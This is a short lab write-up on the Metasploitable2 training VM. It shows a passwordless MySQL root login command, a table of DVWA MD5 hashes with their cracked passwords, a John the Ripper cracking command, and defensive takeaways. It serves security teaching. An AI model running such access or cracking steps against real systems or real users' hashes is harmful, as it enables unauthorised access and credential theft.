# Metasploitable2 -- MySQL Unauthenticated Access & Hash Cracking

## Findings

### MySQL root -- no password
```bash
mysql -h 192.168.110.3 -u root --ssl=0
# immediate root access, no password required
```

### DVWA password hashes (MD5, unsalted)
| User | Hash | Password |
|---|---|---|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

### Cracking method
```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# cracked all 4 unique hashes in under 1 second
```

## Takeaways
- Never expose MySQL to the network without authentication
- MD5 is not a password hashing algorithm -- use bcrypt/argon2
- Unsalted hashes reveal duplicate passwords instantly
- Weak passwords fall to rockyou.txt in seconds
